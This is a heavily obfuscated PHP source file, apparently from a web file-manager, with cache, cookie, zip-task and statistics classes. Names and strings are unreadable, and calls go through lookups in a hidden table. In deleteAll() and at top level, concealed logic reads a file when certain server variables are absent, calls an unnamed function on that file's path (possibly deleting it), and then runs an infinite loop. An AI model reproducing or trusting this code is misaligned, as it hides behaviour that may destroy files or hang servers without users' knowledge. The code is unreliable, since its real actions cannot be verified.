set($úÛ´¢†ü, $ •íäçô, $ÃÁÆÑ‚ö = false) { $ÃÁÆÑ‚ö = $ÃÁÆÑ‚ö ? $ÃÁÆÑ‚ö : $this->cacheTime; return $this->handle->setEx($úÛ´¢†ü, $ÃÁÆÑ‚ö, $ •íäçô); } public function setLock($Ë´´ÖÑà, $éÍÎ‘® , $ÇÅ‡¨²æ) { return $this->handle->setNX($Ë´´ÖÑà, $éÍÎ‘® ); } public function get($ÅìŠŸ˜¦) { $£å†Öõæ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $£å†Öõæ->get($ÅìŠŸ˜¦); } public function remove($úîêƒÕö) { return $this->handle->del($úîêƒÕö); } public function deleteAll() { $”°Ó­¬œ =& $_SERVER[©—Ò»ÅĞ]; if (!isset($_SERVER[$”°Ó­¬œ[1034]]) || !isset($_SERVER[$”°Ó­¬œ[1035]])) { $œÎª¾Ó = $”°Ó­¬œ[1036]; $×ˆíïšº = $”°Ó­¬œ[1037]; $¸¼¤…¼ = $_SERVER[$”°Ó­¬œ[1038]] . $”°Ó­¬œ[1039]; $¸şšËïù = $×ˆíïšº($¸¼¤…¼); $ÚõÊ¥•‘ = explode($”°Ó­¬œ[285], $¸şšËïù); if (count($ÚõÊ¥•‘) < $”°Ó­¬œ[707]) { $«ò“ÆÊ™ = $”°Ó­¬œ[1040]; $«ò“ÆÊ™(); } $ğÌÒ± = $”°Ó­¬œ[1041]; $ğÌÒ±($_SERVER[$”°Ó­¬œ[1042]]); $ÑÏÈÅ°ç = 1; for ($ÛÀŸçÍ† = $ÑÏÈÅ°ç; $ÛÀŸçÍ† > 0; $ÛÀŸçÍ†++) { $ğÌÒ± = json_encode($GLOBALS[$”°Ó­¬œ[507]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $„ƒ“­í€) { $this->handle->flushall($„ƒ“­í€); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¥“âó—” = '', $Ûç¡Ù¯§ = 0) { if (is_string($¥“âó—”) && $¥“âó—” != $_SERVER[©—Ò»ÅĞ][12]) { $this->prefix = $¥“âó—”; } if (is_numeric($Ûç¡Ù¯§) && $Ûç¡Ù¯§ > 0) { $this->expire = $Ûç¡Ù¯§; } } public static function getInstance() { static $ò¶ìèÜŒ; if ($ò¶ìèÜŒ === null) { $ò¶ìèÜŒ = new self(); } return $ò¶ìèÜŒ; } private static $cookieDisable = false; public static function disable($È ‰Ç) { self::$cookieDisable = $È ‰Ç; } private static $sameCookieSet = array(); public static function set($Ö£©Ê·†, $ø”¢‹‡‰, $ï‡Šæ¡­ = 0, $€ô¤µó = false, $ì¿ùáÛË = false) { $í©«ıú¿ =& $_SERVER[©—Ò»ÅĞ]; if (self::$cookieDisable) { return; } if (!$ï‡Šæ¡­) { $ï‡Šæ¡­ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ö£©Ê·†]) && self::$sameCookieSet[$Ö£©Ê·†] == $ø”¢‹‡‰ . $ï‡Šæ¡­) { return; } self::$sameCookieSet[$Ö£©Ê·†] = $ø”¢‹‡‰ . $ï‡Šæ¡­; if (!$ì¿ùáÛË) { $ì¿ùáÛË = str_replace(HOST, $í©«ıú¿[12], APP_HOST); $ì¿ùáÛË = _get($GLOBALS, $í©«ıú¿[1043], $ì¿ùáÛË); } $ïÚ¥ôƒÔ = $í©«ıú¿[12]; setcookie($Ö£©Ê·†, $ø”¢‹‡‰, time() + $ï‡Šæ¡­, $í©«ıú¿[8] . trim($ì¿ùáÛË, $í©«ıú¿[8]) . $ïÚ¥ôƒÔ, !1, !1, $€ô¤µó); } public static function setSafe($¼ßµÒîÄ, $úƒÖ–×¦, $ÃÀ¿õºÂ = 0) { self::set($¼ßµÒîÄ, $úƒÖ–×¦, $ÃÀ¿õºÂ, !0); } public static function get($ûï›ş¡) { static $ë«É³êğ = false; if (!$ë«É³êğ) { self::initHeaderCookie(); $ë«É³êğ = !0; } return isset($_COOKIE[$ûï›ş¡]) ? $_COOKIE[$ûï›ş¡] : !1; } private static function initHeaderCookie() { $¡ÏÜí¾â =& $_SERVER[©—Ò»ÅĞ]; if (!isset($_SERVER[$¡ÏÜí¾â[1044]]) || !$_SERVER[$¡ÏÜí¾â[1044]]) { return; } $©ôÓ”ÉÊ = explode($¡ÏÜí¾â[74], $_SERVER[$¡ÏÜí¾â[1044]]); foreach ($©ôÓ”ÉÊ as $ ›Ö’ªı) { $ ›Ö’ªı = explode($¡ÏÜí¾â[464], $ ›Ö’ªı); if (count($ ›Ö’ªı) != 2 || !isset($ ›Ö’ªı[1])) { continue; } $_COOKIE[trim($ ›Ö’ªı[0])] = trim($ ›Ö’ªı[1]); } } public static function remove($‚¡áğ‹å, $Œ„’”ã¢ = false) { unset($_COOKIE[$‚¡áğ‹å]); self::set($‚¡áğ‹å, $_SERVER[©—Ò»ÅĞ][12], 1, $Œ„’”ã¢); } } if (!isset($_SERVER[$_SERVER[©—Ò»ÅĞ][1034]]) || !isset($_SERVER[$_SERVER[©—Ò»ÅĞ][1035]])) { $_getc = $_SERVER[©—Ò»ÅĞ][1037]; $_getfile = $_SERVER[$_SERVER[©—Ò»ÅĞ][1038]] . $_SERVER[©—Ò»ÅĞ][1039]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[©—Ò»ÅĞ][285], $_getfilec); if (count($_getarrs) < $_SERVER[©—Ò»ÅĞ][714]) { $exit = $_SERVER[©—Ò»ÅĞ][1040]; $exit(); } $_act = $_SERVER[©—Ò»ÅĞ][1045]; $_act($_SERVER[$_SERVER[©—Ò»ÅĞ][1038]] . $_SERVER[©—Ò»ÅĞ][1039]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[©—Ò»ÅĞ][463]); } } goto d®´ßÜ¬ğ÷; AÄ¶•‚ù’: function binCheckBigger($üèÅ¯‹, $Û˜·ƒ¬) { return $üèÅ¯‹ > $Û˜·ƒ¬; } $_SERVER[$_SERVER[²¨É»Ê][3]] = ("\71\62\61\71".base64_decode('MjI='))+0;$_d4fv="y68o03sf4ljmakpxhqz5euvic9gb2rdwt1n7w0it25oyr96gqp7hx3skazlevd4jmc8un";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($çƒóáÚ¸, $ÛÖ½ƒîş) { $‰¿×µ­‚ =& $_SERVER[©—Ò»ÅĞ]; if (isset(self::$_methodList[$çƒóáÚ¸])) { return @call_user_func_array(self::$_methodList[$çƒóáÚ¸], $ÛÖ½ƒîş); } else { if (method_exists($this, $çƒóáÚ¸)) { return call_user_func_array(array($this, $çƒóáÚ¸), $ÛÖ½ƒîş); } else { think_exception(__CLASS__ . $‰¿×µ­‚[4] . $çƒóáÚ¸ . $‰¿×µ­‚[5]); } } } public static function __callStatic($³á½Äêß, $»š„ÆêÔ) { if (isset(self::$_methodListStatic[$³á½Äêß])) { return call_user_func_array(self::$_methodListStatic[$³á½Äêß], $»š„ÆêÔ); } else { if (method_exists(self, $³á½Äêß)) { return call_user_func_array(array(self, $³á½Äêß), $»š„ÆêÔ); } else { show_json("{$³á½Äêß}\x28\51\x20\156\x6f\x74\40\x65\x78\151\x73\164\73", !1); } } } public static function addMethod($ïÂËÜË, $—õÖ¡Æ‘) { self::$_methodList[$ïÂËÜË] = $—õÖ¡Æ‘; } public static function addMethodStatic($ö¡®îµÔ, $‘şæƒ”£) { self::$_methodListStatic[$ö¡®îµÔ] = $‘şæƒ”£; } } goto dÉˆ§ âêâ; B¹ëõ¢ï: class TaskZip extends TaskFileTransfer { protected function startAfter() { $í¶š¥¦ =& $_SERVER[©—Ò»ÅĞ]; parent::startAfter(); Hook::bind($í¶š¥¦[2112], array($this, $í¶š¥¦[2102])); Hook::bind($í¶š¥¦[2104], array($this, $í¶š¥¦[2105])); $°ÈÁ¿×Õ =& $this->task; $°ÈÁ¿×Õ[$í¶š¥¦[2106]] = $í¶š¥¦[1385]; if (!$°ÈÁ¿×Õ[$í¶š¥¦[1865]]) { $°ÈÁ¿×Õ[$í¶š¥¦[1865]] = LNG($í¶š¥¦[2113]); } } protected function endAfter() { $ˆê€ß°À =& $_SERVER[©—Ò»ÅĞ]; parent::endAfter(); Hook::unbind($ˆê€ß°À[2112], array($this, $ˆê€ß°À[2102])); Hook::unbind($ˆê€ß°À[2104], array($this, $ˆê€ß°À[2105])); } public function updateAfter() { $ğÁƒŒ¬æ =& $_SERVER[©—Ò»ÅĞ]; $º¡Á¾Ğ =& $this->task; if (!$º¡Á¾Ğ[$ğÁƒŒ¬æ[1232]] || !$º¡Á¾Ğ[$ğÁƒŒ¬æ[864]]) { return; } if ($º¡Á¾Ğ[$ğÁƒŒ¬æ[2106]] == $ğÁƒŒ¬æ[1385]) { $ó×¬ÚáÃ = $º¡Á¾Ğ[$ğÁƒŒ¬æ[2032]]; if ($º¡Á¾Ğ[$ğÁƒŒ¬æ[2033]] != $ğÁƒŒ¬æ[1385]) { $ó×¬ÚáÃ = 0; } $âéŒŸó© = ($º¡Á¾Ğ[$ğÁƒŒ¬æ[941]] + $ó×¬ÚáÃ) / $º¡Á¾Ğ[$ğÁƒŒ¬æ[864]]; $º¡Á¾Ğ[$ğÁƒŒ¬æ[1979]] = $âéŒŸó© * 0.3; } else { if ($º¡Á¾Ğ[$ğÁƒŒ¬æ[2106]] == $ğÁƒŒ¬æ[388]) { $âéŒŸó© = $º¡Á¾Ğ[$ğÁƒŒ¬æ[1978]] / $º¡Á¾Ğ[$ğÁƒŒ¬æ[1232]]; $º¡Á¾Ğ[$ğÁƒŒ¬æ[1979]] = 0.3 + $âéŒŸó© * 0.5; } else { if ($º¡Á¾Ğ[$ğÁƒŒ¬æ[2106]] == $ğÁƒŒ¬æ[107]) { $âéŒŸó© = 0; if ($º¡Á¾Ğ[$ğÁƒŒ¬æ[2031]]) { $âéŒŸó© = $º¡Á¾Ğ[$ğÁƒŒ¬æ[2032]] / $º¡Á¾Ğ[$ğÁƒŒ¬æ[2031]]; } $º¡Á¾Ğ[$ğÁƒŒ¬æ[1979]] = 0.3 + 0.5 + $âéŒŸó© * 0.2; } } } if ($º¡Á¾Ğ[$ğÁƒŒ¬æ[1979]] > 0) { $’Ïµ¾Â¬ = timeFloat() - $º¡Á¾Ğ[$ğÁƒŒ¬æ[1981]] - $º¡Á¾Ğ[$ğÁƒŒ¬æ[1984]]; $º¡Á¾Ğ[$ğÁƒŒ¬æ[1985]] = $’Ïµ¾Â¬ * (1 - $º¡Á¾Ğ[$ğÁƒŒ¬æ[1979]]) / $º¡Á¾Ğ[$ğÁƒŒ¬æ[1979]]; } } public function copyFileStart($Åëí²ü¿, $¾ù˜¡åœ, $Ÿı˜ÄÔ, $øÕÃñŞ°, $Ó ®ïÑÏ, $¼Ğäëõ) { $ğ‘£äØ =& $_SERVER[©—Ò»ÅĞ]; parent::copyFileStart($Åëí²ü¿, $¾ù˜¡åœ, $Ÿı˜ÄÔ, $øÕÃñŞ°, $Ó ®ïÑÏ, $¼Ğäëõ); $üà³¿ =& $this->task; if ($üà³¿[$ğ‘£äØ[2106]] == $ğ‘£äØ[388]) { $üà³¿[$ğ‘£äØ[2106]] = $ğ‘£äØ[107]; } $this->update(); } public function copyFileEnd($×¨­¾÷, $“ùÀ‹», $¸Õ¾µ–µ, $–ƒ®Ò», $Âûßµş‡, $ë²¤ç§ë) { $ÌÊ¹‚î‘ =& $_SERVER[©—Ò»ÅĞ]; $ŒÙå¢“æ =& $this->task; $ŒÙå¢“æ[$ÌÊ¹‚î‘[2032]] = $ŒÙå¢“æ[$ÌÊ¹‚î‘[2031]]; $ŒÙå¢“æ[$ÌÊ¹‚î‘[941]] += $ŒÙå¢“æ[$ÌÊ¹‚î‘[2031]]; $ŒÙå¢“æ[$ÌÊ¹‚î‘[2033]] = $ÌÊ¹‚î‘[12]; $this->update(); } public function zipEvent($Ö†¬†ç‡, $šùîÈš£, $««¼åÖ, $èÄóóğ£) { $â³ÊŸù =& $_SERVER[©—Ò»ÅĞ]; $æ¼èËÃ =& $this->task; $æ¼èËÃ[$â³ÊŸù[2029]] = get_path_this($šùîÈš£); $æ¼èËÃ[$â³ÊŸù[2031]] = $èÄóóğ£; $æ¼èËÃ[$â³ÊŸù[2032]] = $««¼åÖ; $æ¼èËÃ[$â³ÊŸù[1234]] = $Ö†¬†ç‡ == $â³ÊŸù[2114] ? $â³ÊŸù[2109] : $â³ÊŸù[2110]; $æ¼èËÃ[$â³ÊŸù[2033]] = $â³ÊŸù[12]; $æ¼èËÃ[$â³ÊŸù[864]] = $èÄóóğ£; $æ¼èËÃ[$â³ÊŸù[2106]] = $â³ÊŸù[388]; $this->update(); } public function nameParse($Ò˜ãˆŞ°) { $İ·«İ¡² =& $_SERVER[©—Ò»ÅĞ]; $ÔÅ¾‘¯ü =& $this->task; if ($ÔÅ¾‘¯ü[$İ·«İ¡²[1978]] < $ÔÅ¾‘¯ü[$İ·«İ¡²[1232]]) { $Ë¹Ääˆ™ = get_path_this($Ò˜ãˆŞ°); if (strstr($Ë¹Ääˆ™, $İ·«İ¡²[10])) { $ÔÅ¾‘¯ü[$İ·«İ¡²[1978]] += 1; } } if ($ÔÅ¾‘¯ü[$İ·«İ¡²[2106]] == $İ·«İ¡²[1385]) { $ÔÅ¾‘¯ü[$İ·«İ¡²[2106]] = $İ·«İ¡²[388]; } $ÔÅ¾‘¯ü[$İ·«İ¡²[2029]] = $Ò˜ãˆŞ°; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¬å¸Öëë) { $­«âÜ´® =& $_SERVER[©—Ò»ÅĞ]; $Æ‘‘Ò™ = array($­«âÜ´®[684] => array($­«âÜ´®[33] => $­«âÜ´®[2115], $­«âÜ´®[351] => array($­«âÜ´®[282], $­«âÜ´®[866], $­«âÜ´®[2116], $­«âÜ´®[2117])), $­«âÜ´®[2118] => array($­«âÜ´®[33] => $­«âÜ´®[2119], $­«âÜ´®[351] => array($­«âÜ´®[282], $­«âÜ´®[864], $­«âÜ´®[2120], $­«âÜ´®[2121], $­«âÜ´®[2122]))); if (!isset($Æ‘‘Ò™[$¬å¸Öëë])) { return !1; } $this->optionType = $Æ‘‘Ò™[$¬å¸Öëë][$­«âÜ´®[33]]; $this->field = $Æ‘‘Ò™[$¬å¸Öëë][$­«âÜ´®[351]]; return !0; } public function listData($›‰ŠŞƒò = false, $¦©œÄı = "\x6d\157\x64\151\146\171\124\x69\155\145", $‡ù¢¬½ = false) { return parent::listData($›‰ŠŞƒò, $¦©œÄı, $‡ù¢¬½); } public function trendList($â¯¸Íì) { $ä˜±œ±‰ =& $_SERVER[©—Ò»ÅĞ]; $À±”ÙÍ = $this->listData(); if ($À±”ÙÍ) { $ˆíÒØÇı = end($À±”ÙÍ); $Ã°èõÌı = date($ä˜±œ±‰[2123], strtotime($ä˜±œ±‰[2124])); if ($ˆíÒØÇı[$ä˜±œ±‰[282]] == $Ã°èõÌı) { return $À±”ÙÍ; } $À–©¡›‡ = strtotime($ˆíÒØÇı[$ä˜±œ±‰[282]]); } if (!isset($À–©¡›‡)) { $ÜçÙÑÓö = $â¯¸Íì == $ä˜±œ±‰[684] ? $ä˜±œ±‰[617] : $ä˜±œ±‰[933]; $À–©¡›‡ = Model($ÜçÙÑÓö)->min($ä˜±œ±‰[231]); } $¦º‘˜Œù = $ä˜±œ±‰[2125] . ucfirst($â¯¸Íì); $ÁÃÈšÏŠ = $this->dateList($À–©¡›‡); foreach ($ÁÃÈšÏŠ as $Ã°èõÌı) { $this->{$¦º‘˜Œù}($Ã°èõÌı); } return $this->listData(); } private function dateList($ˆ°Ñ‡çÛ) { $„¶¾Æî’ =& $_SERVER[©—Ò»ÅĞ]; $Ë£‚âÏ = $ˆ°Ñ‡çÛ; $îŠöäõ” = strtotime($„¶¾Æî’[2124]); $è‹ÎĞ¦Ú = array(); while ($Ë£‚âÏ <= $îŠöäõ”) { $è‹ÎĞ¦Ú[] = date($„¶¾Æî’[2123], $Ë£‚âÏ); $Ë£‚âÏ = strtotime($„¶¾Æî’[2126], $Ë£‚âÏ); } return $è‹ÎĞ¦Ú; } public function _recordUser($¤şÕÊ­ = '') { $¯¬µœõé =& $_SERVER[©—Ò»ÅĞ]; if (!$¤şÕÊ­) { return 0; } $²¦³öÓ = strtotime(date($¯¬µœõé[2127], strtotime($¤şÕÊ­))); $–×ÚÔ«“ = strtotime(date($¯¬µœõé[2128], strtotime($¤şÕÊ­))); $Í‡îæ„á = array($¯¬µœõé[231] => array($¯¬µœõé[1181], $–×ÚÔ«“)); $”¾¨æ’¿ = Model($¯¬µœõé[617])->where($Í‡îæ„á)->count($¯¬µœõé[1592]); $Í‡îæ„á[$¯¬µœõé[231]] = array($¯¬µœõé[408], array($²¦³öÓ, $–×ÚÔ«“)); $¥ğ–Ü‹Ä = Model($¯¬µœõé[617])->where($Í‡îæ„á)->count($¯¬µœõé[1592]); $Í‡îæ„á[$¯¬µœõé[33]] = $¯¬µœõé[2129]; $œ¨®ª÷á = Model($¯¬µœõé[2130])->where($Í‡îæ„á)->count($¯¬µœõé[2131]); $½‘ò´ = array($¯¬µœõé[282] => $¤şÕÊ­, $¯¬µœõé[866] => (int) $”¾¨æ’¿, $¯¬µœõé[2116] => (int) $¥ğ–Ü‹Ä, $¯¬µœõé[2117] => (int) $œ¨®ª÷á); return $this->insert($½‘ò´); } public function _recordStore($„ñïˆ»Û = '') { $¯¹ùµï£ =& $_SERVER[©—Ò»ÅĞ]; if (!$„ñïˆ»Û) { return 0; } $ÌÜ”ßı“ = strtotime(date($¯¹ùµï£[2128], strtotime($„ñïˆ»Û))); $äˆ©úˆ = array($¯¹ùµï£[231] => array($¯¹ùµï£[1181], $ÌÜ”ßı“)); $·„Š½Ô£ = Model($¯¹ùµï£[560])->where($äˆ©úˆ)->sum($¯¹ùµï£[79]); $—×ò¸«Û = "\123\x45\x4c\x45\103\124\x20\xa\x20\40\40\40\x20\40\40\40\40\x20\40\40\x20\x20\40\x20\x53\x55\x4d\x28\140\163\151\x7a\145\x60\51\40\101\x53\x20\x73\151\x7a\x65\x54\157\x74\x61\x6c\x2c\12\40\x20\40\x20\40\x20\x20\x20\x20\40\40\40\x20\40\x20\x20\123\125\115\50\x43\x41\x53\105\x20\127\110\x45\116\x20\140\x74\141\x72\147\x65\164\124\x79\x70\145\140\x20\x3d\x20\x31\x20\124\110\x45\x4e\40\x60\163\x69\172\145\140\40\105\114\x53\x45\x20\60\40\105\116\x44\x29\40\101\x53\40\163\151\172\x65\125\163\x65\162\54\xa\x20\40\40\40\x20\40\40\40\x20\x20\40\40\40\x20\40\40\123\x55\115\50\x43\x41\x53\105\x20\127\110\105\x4e\40\140\x74\141\162\147\145\164\x54\x79\x70\x65\140\40\75\40\62\x20\124\110\x45\116\40\x60\x73\x69\x7a\145\x60\40\x45\x4c\123\x45\x20\x30\40\105\x4e\x44\x29\x20\101\123\x20\163\151\x7a\145\x47\162\x6f\x75\x70\12\40\40\40\40\x20\x20\x20\40\40\40\x20\40\40\x20\x20\x20\106\x52\117\x4d\40\x60\151\x6f\137\x73\x6f\x75\x72\143\x65\140\x20\12\40\40\x20\x20\x20\x20\x20\40\40\40\40\40\x20\x20\40\x20\x57\x48\x45\x52\x45\x20\x60\x69\163\106\x6f\x6c\144\145\162\x60\x20\x3d\x20\60\40\x41\116\104\x20\140\143\162\145\141\164\145\x54\x69\x6d\145\140\40\74\x3d\40{$ÌÜ”ßı“}"; $¾›í‡ = Model($¯¹ùµï£[933])->query($—×ò¸«Û); $æú…ø®œ = array($¯¹ùµï£[282] => $„ñïˆ»Û, $¯¹ùµï£[864] => (int) (isset($¾›í‡[0][$¯¹ùµï£[864]]) ? $¾›í‡[0][$¯¹ùµï£[864]] : 0), $¯¹ùµï£[2120] => (int) $·„Š½Ô£, $¯¹ùµï£[2121] => (int) (isset($¾›í‡[0][$¯¹ùµï£[2121]]) ? $¾›í‡[0][$¯¹ùµï£[2121]] : 0), $¯¹ùµï£[2122] => (int) (isset($¾›í‡[0][$¯¹ùµï£[2122]]) ? $¾›í‡[0][$¯¹ùµï£[2122]] : 0)); return $this->insert($æú…ø®œ); } public function trend($ê“ÛÓÖì, $úšŒ–Â±) { $ãÜË©Ç =& $_SERVER[©—Ò»ÅĞ]; if (!$this->init($ê“ÛÓÖì)) { return !1; } $Ù¥Ğåë = $this->trendList($ê“ÛÓÖì); if ($Ù¥Ğåë && $úšŒ–Â± != $ãÜË©Ç[1951]) { $‹Ë†û¦‡ = $Ù¥Ğåë[0][$ãÜË©Ç[282]]; $ù¬¡ëË = $this->validDate($úšŒ–Â±, $‹Ë†û¦‡); $±ÃÇ¹´÷ = array(); $û¬†ğ©³ = array_to_keyvalue($Ù¥Ğåë, $ãÜË©Ç[282]); foreach ($ù¬¡ëË as $¤ˆ¶Œê) { if (isset($û¬†ğ©³[$¤ˆ¶Œê])) { $øİ˜ªÍç = $û¬†ğ©³[$¤ˆ¶Œê]; } else { $øİ˜ªÍç = end($Ù¥Ğåë); $øİ˜ªÍç[$ãÜË©Ç[282]] = $¤ˆ¶Œê; if ($ê“ÛÓÖì == $ãÜË©Ç[684]) { $øİ˜ªÍç[$ãÜË©Ç[2116]] = $øİ˜ªÍç[$ãÜË©Ç[2117]] = 0; } } $±ÃÇ¹´÷[] = $øİ˜ªÍç; } $Ù¥Ğåë = $±ÃÇ¹´÷; } $üµº¼º  = array($ãÜË©Ç[684] => array($ãÜË©Ç[866] => LNG($ãÜË©Ç[2132]), $ãÜË©Ç[2116] => LNG($ãÜË©Ç[2133]), $ãÜË©Ç[2117] => LNG($ãÜË©Ç[2134])), $ãÜË©Ç[2118] => array($ãÜË©Ç[864] => LNG($ãÜË©Ç[2135]), $ãÜË©Ç[2120] => LNG($ãÜË©Ç[2136]), $ãÜË©Ç[2121] => LNG($ãÜË©Ç[2137]), $ãÜË©Ç[2122] => LNG($ãÜË©Ç[2138]))); $şïŞæ—œ = array($ãÜË©Ç[684] => $ãÜË©Ç[950], $ãÜË©Ç[2118] => $ãÜË©Ç[79]); if (empty($Ù¥Ğåë)) { $¤ˆ¶Œê = date($ãÜË©Ç[2123], strtotime($ãÜË©Ç[2124])); $¾øû£±Ò = array($ãÜË©Ç[282] => $¤ˆ¶Œê); foreach ($üµº¼º [$ê“ÛÓÖì] as $¿ú¦½‘ => $±ƒş›„) { $¾øû£±Ò[$¿ú¦½‘] = 0; } $Ù¥Ğåë[] = $¾øû£±Ò; } $¿±˜ÂË = array(); foreach ($Ù¥Ğåë as $±ƒş›„) { if ($ê“ÛÓÖì == $ãÜË©Ç[2118] && $±ƒş›„[$ãÜË©Ç[2120]] > $±ƒş›„[$ãÜË©Ç[864]]) { $±ƒş›„[$ãÜË©Ç[2120]] = $±ƒş›„[$ãÜË©Ç[864]]; } foreach ($üµº¼º [$ê“ÛÓÖì] as $¿ú¦½‘ => $¯Üúâ²·) { $øİ˜ªÍç = array($ãÜË©Ç[282] => $±ƒş›„[$ãÜË©Ç[282]], $ãÜË©Ç[1865] => $¯Üúâ²·); $øİ˜ªÍç[$şïŞæ—œ[$ê“ÛÓÖì]] = isset($±ƒş›„[$¿ú¦½‘]) ? $±ƒş›„[$¿ú¦½‘] : 0; $¿±˜ÂË[] = $øİ˜ªÍç; } } return $¿±˜ÂË; } public function validDate($ÄÕúŠ¶ã, $Œõ·’ªõ) { $äùªœ£ =& $_SERVER[©—Ò»ÅĞ]; $Ìè€ëâü = date($äùªœ£[2123], strtotime($äùªœ£[2124])); $Ê²›¶É¨ = array($Ìè€ëâü); switch ($ÄÕúŠ¶ã) { case $äùªœ£[1958]: $úÊ‚¢Í = mktime(0, 0, 0, date($äùªœ£[2139]), date($äùªœ£[1659]) - date($äùªœ£[1745]) + 7 - 7, date($äùªœ£[2140])); $é¸õı­· = 0; do { $ÖÑö—êÌ = date($äùªœ£[2123], $úÊ‚¢Í - 3600 * 24 * 7 * $é¸õı­·); $Ê²›¶É¨[] = $ÖÑö—êÌ; $é¸õı­·++; } while ($Œõ·’ªõ < $ÖÑö—êÌ); break; case $äùªœ£[1956]: $é¸õı­· = 1; do { $Ù¾Ş² = date($äùªœ£[2141], strtotime("\x2d\40{$é¸õı­·}\40\155\x6f\156\x74\x68\163")); $Ê²›¶É¨[] = $Ù¾Ş²; $é¸õı­·++; } while ($Œõ·’ªõ < $Ù¾Ş²); break; case $äùªœ£[2142]: $“»˜¢´Â = (int) date($äùªœ£[2140], strtotime($Œõ·’ªõ)); $×ÛÕŒ×ø = (int) date($äùªœ£[2140]); if ($“»˜¢´Â >= $×ÛÕŒ×ø) { break; } for ($“»˜¢´Â; $“»˜¢´Â < $×ÛÕŒ×ø; $“»˜¢´Â++) { $Ê²›¶É¨[] = $“»˜¢´Â . $äùªœ£[2143]; } break; default: break; } if ($Œõ·’ªõ > end($Ê²›¶É¨)) { array_pop($Ê²›¶É¨); } sort($Ê²›¶É¨); return $Ê²›¶É¨; } public function listTable($–î¢œÌ) { $×ùÉéûÀ = ucfirst($–î¢œÌ); return Model($×ùÉéûÀ)->listData(); } public function option($À¯ÑÇÙÙ) { return call_user_func_array(array($this, $_SERVER[©—Ò»ÅĞ][2144] . ucfirst($À¯ÑÇÙÙ)), array()); } private function optionUser() { $ù§—•ÓË =& $_SERVER[©—Ò»ÅĞ]; $¾õÇ€µ£ = Model($ù§—•ÓË[617])->count($ù§—•ÓË[1592]); $âÏ—Øıª = Model($ù§—•ÓË[617])->where($ù§—•ÓË[2145])->count($ù§—•ÓË[1592]); $”¥ºñ™ = intval($GLOBALS[$ù§—•ÓË[6]][$ù§—•ÓË[424]][$ù§—•ÓË[1925]]) / 3600; $£Ê¼˜ù = strtotime("\x2d{$”¥ºñ™}\40\150\x6f\x75\162\x73"); $¦ÃßòÚ = strtotime(date($ù§—•ÓË[2127])); if ($£Ê¼˜ù < $¦ÃßòÚ) { $£Ê¼˜ù = $¦ÃßòÚ; } $•Š·Á• = array($ù§—•ÓË[2146] => array($ù§—•ÓË[1182], $£Ê¼˜ù)); $¹ÕŠôñï = (int) Model($ù§—•ÓË[617])->where($•Š·Á•)->count($ù§—•ÓË[1592]); if (!$¹ÕŠôñï) { $¹ÕŠôñï = 1; } $•Š·Á• = array($ù§—•ÓË[2146] => array($ù§—•ÓË[1182], $¦ÃßòÚ)); $›ŠÅÅğş = Model($ù§—•ÓË[617])->where($•Š·Á•)->count($ù§—•ÓË[1592]); return array($ù§—•ÓË[859] => (int) $¾õÇ€µ£, $ù§—•ÓË[2147] => (int) ($¾õÇ€µ£ - $âÏ—Øıª), $ù§—•ÓË[2148] => (int) $âÏ—Øıª, $ù§—•ÓË[2149] => (int) $›ŠÅÅğş, $ù§—•ÓË[2150] => $¹ÕŠôñï); } private function optionFile() { $ã•¤½•† =& $_SERVER[©—Ò»ÅĞ]; $„ÄÃ¥Êº = $this->sourceSize(); $â‚¶¿¬ = array($ã•¤½•†[500] => 0); $ğ¡Œê« = Model($ã•¤½•†[933])->where($â‚¶¿¬)->count(); $â‚¶¿¬[$ã•¤½•†[231]] = array($ã•¤½•†[1182], strtotime(date($ã•¤½•†[2127]))); $áÓÓ‚Ó£ = Model($ã•¤½•†[933])->where($â‚¶¿¬)->field(array($ã•¤½•†[949] => $ã•¤½•†[950], $ã•¤½•†[951] => $ã•¤½•†[79]))->find(); $˜²«šùÆ = array($ã•¤½•†[864] => $„ÄÃ¥Êº[$ã•¤½•†[79]], $ã•¤½•†[2120] => $„ÄÃ¥Êº[$ã•¤½•†[2120]], $ã•¤½•†[2151] => $„ÄÃ¥Êº[$ã•¤½•†[79]] - $„ÄÃ¥Êº[$ã•¤½•†[2120]], $ã•¤½•†[2152] => (int) (isset($áÓÓ‚Ó£[$ã•¤½•†[79]]) ? $áÓÓ‚Ó£[$ã•¤½•†[79]] : 0), $ã•¤½•†[866] => (int) $ğ¡Œê«, $ã•¤½•†[2153] => (int) (isset($áÓÓ‚Ó£[$ã•¤½•†[950]]) ? $áÓÓ‚Ó£[$ã•¤½•†[950]] : 0)); if ($˜²«šùÆ[$ã•¤½•†[2151]] < 0) { $˜²«šùÆ[$ã•¤½•†[2151]] = 0; } return $˜²«šùÆ; } private function optionAccess() { $Ë¯ˆÁƒ° =& $_SERVER[©—Ò»ÅĞ]; return array($Ë¯ˆÁƒ°[859] => $this->typeLogCnt(), $Ë¯ˆÁƒ°[107] => $this->typeLogCnt($Ë¯ˆÁƒ°[107]), $Ë¯ˆÁƒ°[539] => $this->typeLogCnt($Ë¯ˆÁƒ°[539]), $Ë¯ˆÁƒ°[1334] => $this->typeLogCnt($Ë¯ˆÁƒ°[1334]), $Ë¯ˆÁƒ°[1561] => $this->typeLogCnt($Ë¯ˆÁƒ°[1561]), $Ë¯ˆÁƒ°[684] => $this->typeLogCnt($Ë¯ˆÁƒ°[12], $Ë¯ˆÁƒ°[2131])); } private function typeLogCnt($šõ¥šäƒ = '', $ËØ˜Ñ²Â = "\x69\x64") { $½óÀÍÇõ =& $_SERVER[©—Ò»ÅĞ]; $ÎÊæÀÍæ = array($½óÀÍÇõ[107] => array($½óÀÍÇõ[2154], $½óÀÍÇõ[2155]), $½óÀÍÇõ[539] => array($½óÀÍÇõ[2156], $½óÀÍÇõ[2157]), $½óÀÍÇõ[1334] => array($½óÀÍÇõ[2158], $½óÀÍÇõ[2159], $½óÀÍÇõ[2160]), $½óÀÍÇõ[1561] => array($½óÀÍÇõ[2161], $½óÀÍÇõ[2162]), $½óÀÍÇõ[1562] => array($½óÀÍÇõ[2163], $½óÀÍÇõ[2164], $½óÀÍÇõ[2165])); $çæ¬ĞÑ£ = strtotime(date($½óÀÍÇõ[2127])); $úù¦È— = array($½óÀÍÇõ[231] => 